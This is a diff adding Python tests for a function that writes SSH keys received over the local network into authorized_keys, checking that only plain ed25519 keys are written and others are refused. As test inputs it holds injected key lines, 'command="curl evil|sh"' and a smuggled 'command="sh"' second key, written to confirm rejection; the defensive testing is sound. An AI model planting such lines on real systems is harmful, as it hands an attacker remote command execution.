@@ -20,6 +20,7 @@ from __future__ import annotations
 import importlib.util
 import json
 import sqlite3
+import subprocess
 from pathlib import Path
 from types import ModuleType
 
@@ -216,3 +217,123 @@ def test_it_closes_before_the_rooms_it_leads_to() -> None:
 
     assert run.STOP_ORDER[0] == "Link", "a door closes before the room is emptied"
     assert run.START_ORDER[-1] == "Link", "and opens once SIRVIS has something to serve"
+
+
+# ── Letting another computer in, from a key that arrived over the network ─────────────────
+#
+# Pairing from the screen means a key reaches this machine by multicast announcement, and
+# `~/.ssh/authorized_keys` is a file where one stray word is a shell. These are the tests for
+# the one function that writes there.
+
+REAL_KEY = ("ssh-ed25519 "
+            "AAAAC3NzaC1lZDI1NTE5AAAAIHZBEWrJ0hYdfrLfiu0Uq1VkKLsH5VoGxD0QhXQWvJ9y")
+
+
+def _home(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> Path:
+    """A home directory this test owns, so nothing here can reach the owner's own SSH."""
+    monkeypatch.setenv("HOME", str(tmp_path))
+    keys = tmp_path / ".ssh" / "authorized_keys"
+    keys.parent.mkdir(parents=True, exist_ok=True)
+    keys.write_text("ssh-rsa AAAAsomethingelse the owner's own key\n", encoding="utf-8")
+    return keys
+
+
+def test_allowing_a_computer_writes_one_restricted_line_and_keeps_the_rest(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    run = _load()
+    keys = _home(monkeypatch, tmp_path)
+
+    answer = run.link_authorize(f"{REAL_KEY} nervis link from thinkpad", "ThinkPad")
+
+    assert answer["ok"] is True and answer["already"] is False
+    lines = keys.read_text(encoding="utf-8").splitlines()
+    assert lines[0] == "ssh-rsa AAAAsomethingelse the owner's own key", (
+        "every other key in that file is somebody's way in; none of them may move"
+    )
+    assert lines[1].startswith("restrict,port-forwarding,")
+    assert lines[1].endswith(f"{REAL_KEY} nervis link ThinkPad")
+    assert oct(keys.stat().st_mode)[-3:] == "600"
+
+
+def test_allowing_the_same_computer_twice_adds_nothing(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    run = _load()
+    keys = _home(monkeypatch, tmp_path)
+    run.link_authorize(REAL_KEY, "ThinkPad")
+
+    again = run.link_authorize(REAL_KEY, "ThinkPad")
+
+    assert again["already"] is True
+    assert len(keys.read_text(encoding="utf-8").splitlines()) == 2
+
+
+@pytest.mark.parametrize("offered", [
+    'command="curl evil|sh" ' + REAL_KEY,          # options in front of the key
+    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ",      # another algorithm entirely
+    "not a key at all",
+    "",
+])
+def test_anything_that_is_not_an_ed25519_key_is_refused(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, offered: str
+) -> None:
+    """**The key comes from the local network**, so this is the boundary that matters.
+
+    A second line, or options in front of the key, would be somebody else's shell on this
+    computer. Only two fields are ever taken, and only when they are an ed25519 key; the
+    restrictions are written here rather than accepted from anywhere.
+    """
+    run = _load()
+    keys = _home(monkeypatch, tmp_path)
+    before = keys.read_text(encoding="utf-8")
+
+    answer = run.link_authorize(offered, "whoever")
+
+    assert answer["ok"] is False
+    assert keys.read_text(encoding="utf-8") == before, "nothing was written"
+
+
+def test_a_second_key_smuggled_after_a_good_one_is_not_written(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    """Two fields are taken and the rest is dropped, so a trailing line cannot ride along."""
+    run = _load()
+    keys = _home(monkeypatch, tmp_path)
+
+    run.link_authorize(f"{REAL_KEY} label\ncommand=\"sh\" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEEE",
+                       "ThinkPad")
+
+    written = keys.read_text(encoding="utf-8")
+    assert "command=" not in written and written.count("ssh-ed25519") == 1
+
+
+def test_stopping_allows_takes_only_that_key_back(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    run = _load()
+    keys = _home(monkeypatch, tmp_path)
+    run.link_authorize(REAL_KEY, "ThinkPad")
+    other = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHZBEWrJ0hYdfrLfiu0Uq1VkKLsH5VoGxD0QhXQWvJ8x"
+    run.link_authorize(other, "Mac mini")
+
+    removed = run.link_revoke(REAL_KEY)
+
+    assert removed == {"ok": True, "removed": 1}
+    left = keys.read_text(encoding="utf-8")
+    assert REAL_KEY not in left
+    assert other in left and "the owner's own key" in left
+
+
+def test_a_keys_fingerprint_is_what_ssh_keygen_says(tmp_path: Path) -> None:
+    """The string both computers show while pairing, so a person can compare them."""
+    run = _load()
+    made = subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "test",
+                           "-f", str(tmp_path / "k")], capture_output=True, check=False)
+    assert made.returncode == 0, made.stderr
+    public = (tmp_path / "k.pub").read_text(encoding="utf-8")
+    expected = subprocess.run(["ssh-keygen", "-lf", str(tmp_path / "k.pub")],
+                              capture_output=True, text=True, check=False).stdout.split()[1]
+
+    assert run.link_key_fingerprint(public) == expected
+    assert run.link_key_fingerprint("nonsense") == ""
